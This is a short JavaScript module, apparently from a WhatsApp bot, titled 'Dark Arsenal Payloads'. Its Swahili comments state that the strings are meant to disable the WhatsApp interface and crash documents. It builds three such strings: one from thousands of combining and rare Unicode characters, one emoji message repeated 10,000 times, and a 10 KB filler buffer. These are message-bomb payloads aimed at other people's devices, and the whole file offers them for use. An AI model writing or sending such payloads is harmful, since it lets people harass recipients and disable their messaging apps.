/**
 * ALLY SCOTT V11 - ALIEN SYSTEM
 * Dark Arsenal Payloads
 */

const payloads = {
    // Hii ni payload nzito inayochanganya alama nyingi kulemaza WhatsApp UI
    crashPayload: (function() {
        let str = "☣️ ALLY SCOTT CRASH ☣️\n";
        let heavy = "҈".repeat(500) + "⡈".repeat(500) + "ᚙ".repeat(500);
        for (let i = 0; i < 50; i++) {
            str += heavy + "\n";
        }
        return str;
    })(),

    // Payload ya ziada kwa ajili ya Document crashes
    docPayload: "📂 SYSTEM OVERLOAD 📂".repeat(10000),

    // Hii inasaidia kwenye Buffer management
    overflow: Buffer.alloc(1024 * 10, 'X').toString()
};

module.exports = payloads;
